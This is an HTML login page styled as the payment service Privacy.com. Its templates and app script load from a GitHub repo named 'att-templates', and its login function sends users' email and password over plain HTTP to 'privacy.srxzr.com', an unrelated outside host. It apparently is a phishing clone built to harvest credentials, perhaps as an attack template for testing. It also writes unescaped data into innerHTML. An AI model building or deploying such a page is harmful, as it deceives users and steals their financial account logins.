<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privacy.com</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <script>
        // =================================================================
        // CONFIGURATION - Change these URLs to match your servers
        // =================================================================
        const TEMPLATE_BASE_URL = 'https://raw.githubusercontent.com/srxzr-oai/att-templates/refs/heads/main/templates';
        const API_BASE_URL = 'http://privacy.srxzr.com/'; // TODO: change this to the actual API URL in prod
        // =================================================================
    </script>
    <link id="custom-css" href="" rel="stylesheet">
</head>
<body>
    <div id="app-container">
        <div class="d-flex justify-content-center align-items-center min-vh-100">
            <div class="text-center">
                <div class="spinner-border text-primary" role="status">
                    <span class="visually-hidden">Loading...</span>
                </div>
                <p class="mt-3 text-muted">Loading Privacy.com...</p>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script id="external-app-js" src=""></script>
    <script>
        // Set up dynamic resource loading
        document.getElementById('custom-css').href = TEMPLATE_BASE_URL + '/css/style.css';
        document.getElementById('external-app-js').src = TEMPLATE_BASE_URL + '/js/app.js';
        
        // Template cache
        const templateCache = {};
        const BASE_TEMPLATE_URL = TEMPLATE_BASE_URL + '/';
        
        // Application state
        let appState = {
            user: null,
            currentPage: 'index',
            session: {}
        };

        // Initialize app
        document.addEventListener('DOMContentLoaded', function() {
            initializeApp();
        });

        async function initializeApp() {
            try {
                // Load session info
                await loadSessionInfo();
                
                // Determine current page from URL
                const path = window.location.pathname;
                if (path === '/login') {
                    appState.currentPage = 'login';
                } else if (path === '/dashboard') {
                    appState.currentPage = 'dashboard';
                } else if (path.includes('/404')) {
                    appState.currentPage = '404';
                } else if (path.includes('/500')) {
                    appState.currentPage = '500';
                } else {
                    appState.currentPage = 'index';
                }
                
                // Load and render the appropriate template
                await loadTemplate(appState.currentPage);
                
            } catch (error) {
                console.error('Error initializing app:', error);
                await loadTemplate('500');
            }
        }

        async function loadTemplate(templateName) {
            try {
                if (!templateCache[templateName]) {
                    const response = await fetch(`${BASE_TEMPLATE_URL}${templateName}.html`);
                    if (!response.ok) {
                        throw new Error(`Failed to load template: ${templateName}`);
                    }
                    templateCache[templateName] = await response.text();
                }
                
                const template = templateCache[templateName];
                const renderedHtml = renderTemplate(template, appState);
                
                document.getElementById('app-container').innerHTML = renderedHtml;
                
                // Initialize page-specific functionality
                initializePage(templateName);
                
            } catch (error) {
                console.error('Error loading template:', error);
                document.getElementById('app-container').innerHTML = `
                    <div class="container mt-5">
                        <div class="alert alert-danger">
                            <h4>Error Loading Page</h4>
                            <p>Unable to load the requested page. Please try again.</p>
                        </div>
                    </div>
                `;
            }
        }

        function renderTemplate(template, data) {
            // Simple template rendering - replace placeholders
            let rendered = template;
            
            // Replace session data
            rendered = rendered.replace(/\{\{\s*session\.user_email\s*\}\}/g, data.session.user_email || '');
            rendered = rendered.replace(/\{\{\s*session\.login_time\s*\}\}/g, data.session.login_time || '');
            
            // Replace conditional blocks
            if (data.session.user_email) {
                rendered = rendered.replace(/\{\{\s*if\s+session\.user_email\s*\}\}(.*?)\{\{\s*endif\s*\}\}/gs, '$1');
                rendered = rendered.replace(/\{\{\s*if\s+not\s+session\.user_email\s*\}\}(.*?)\{\{\s*endif\s*\}\}/gs, '');
            } else {
                rendered = rendered.replace(/\{\{\s*if\s+session\.user_email\s*\}\}(.*?)\{\{\s*endif\s*\}\}/gs, '');
                rendered = rendered.replace(/\{\{\s*if\s+not\s+session\.user_email\s*\}\}(.*?)\{\{\s*endif\s*\}\}/gs, '$1');
            }
            
            // Replace validated_email
            rendered = rendered.replace(/\{\{\s*validated_email\s*\}\}/g, data.validated_email || '');
            
            return rendered;
        }

        function initializePage(templateName) {
            // Initialize page-specific functionality
            if (templateName === 'login') {
                initializeLoginPage();
            } else if (templateName === 'dashboard') {
                initializeDashboardPage();
            }
        }

        function initializeLoginPage() {
            // Add login form handler
            const loginForm = document.getElementById('loginForm');
            if (loginForm) {
                loginForm.addEventListener('submit', handleLogin);
            }
        }

        function initializeDashboardPage() {
            // Add dashboard functionality
            loadUserData();
        }

        async function loadSessionInfo() {
            try {
                const response = await fetch('/api/session');
                if (response.ok) {
                    appState.session = await response.json();
                }
            } catch (error) {
                console.log('No session info available');
            }
        }

        async function handleLogin(event) {
            event.preventDefault();
            
            const form = event.target;
            const email = form.email.value;
            const password = form.password.value;
            const submitButton = document.getElementById('loginButton');
            
            // Show loading state
            submitButton.disabled = true;
            submitButton.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i>Signing In...';
            
                         try {
                 const response = await fetch(API_BASE_URL + '/api/login', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
                         email: email,
                         password: password
                     })
                 });
                
                if (response.ok) {
                    const result = await response.json();
                    appState.session.user_email = email;
                    appState.session.login_time = new Date().toISOString();
                    
                    // Navigate to dashboard
                    window.history.pushState({}, '', '/dashboard');
                    appState.currentPage = 'dashboard';
                    await loadTemplate('dashboard');
                } else {
                    // Handle error response
                    const errorData = await response.json();
                    showError(errorData.detail || 'Login failed');
                }
            } catch (error) {
                console.error('Login error:', error);
                showError('Network error. Please try again.');
            } finally {
                // Reset button state
                submitButton.disabled = false;
                submitButton.innerHTML = '<i class="fas fa-sign-in-alt me-2"></i>Sign In';
            }
        }

        function showError(message) {
            // Remove existing error alerts
            const existingAlerts = document.querySelectorAll('.alert-danger');
            existingAlerts.forEach(alert => alert.remove());
            
            // Create new error alert
            const alertDiv = document.createElement('div');
            alertDiv.className = 'alert alert-danger';
            alertDiv.innerHTML = `<i class="fas fa-exclamation-circle me-2"></i>${message}`;
            
            // Insert before the form
            const form = document.getElementById('loginForm');
            if (form) {
                form.parentNode.insertBefore(alertDiv, form);
            }
        }

        async function loadUserData() {
            try {
                const response = await fetch('/api/cards');
                if (response.ok) {
                    const data = await response.json();
                    displayCards(data.cards);
                }
            } catch (error) {
                console.error('Error loading user data:', error);
            }
        }

        function displayCards(cards) {
            const cardsContainer = document.getElementById('cards-container');
            if (!cardsContainer) return;
            
            cardsContainer.innerHTML = cards.map(card => `
                <div class="col-md-6 mb-4">
                    <div class="card">
                        <div class="card-body">
                            <h5 class="card-title">${card.name}</h5>
                            <p class="card-text">
                                <strong>****${card.last_four}</strong><br>
                                <small class="text-muted">Limit: $${card.limit} | Spent: $${card.spent}</small>
                            </p>
                            <span class="badge bg-${card.status === 'active' ? 'success' : 'secondary'}">${card.status}</span>
                        </div>
                    </div>
                </div>
            `).join('');
        }

        // Navigation handler
        function navigate(page) {
            appState.currentPage = page;
            window.history.pushState({}, '', `/${page === 'index' ? '' : page}`);
            loadTemplate(page);
        }

        // Handle browser back/forward
        window.addEventListener('popstate', function(event) {
            initializeApp();
        });
    </script>
</body>
</html> 